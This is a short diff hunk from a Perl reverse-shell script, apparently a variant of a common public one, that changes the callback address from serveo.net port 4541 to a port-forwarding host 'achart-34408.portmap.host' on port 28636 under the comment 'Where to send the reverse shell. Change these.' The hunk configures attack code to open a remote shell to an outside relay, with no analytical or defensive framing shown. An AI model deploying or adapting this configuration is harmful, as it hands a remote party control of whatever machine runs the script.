@@ -42,8 +42,8 @@ use POSIX;
 my $VERSION = "1.0";
 
 # Where to send the reverse shell.  Change these.
-my $ip = 'serveo.net';
-my $port = 4541;
+my $ip = 'achart-34408.portmap.host';
+my $port = 28636;
 
 # Options
 my $daemon = 1;
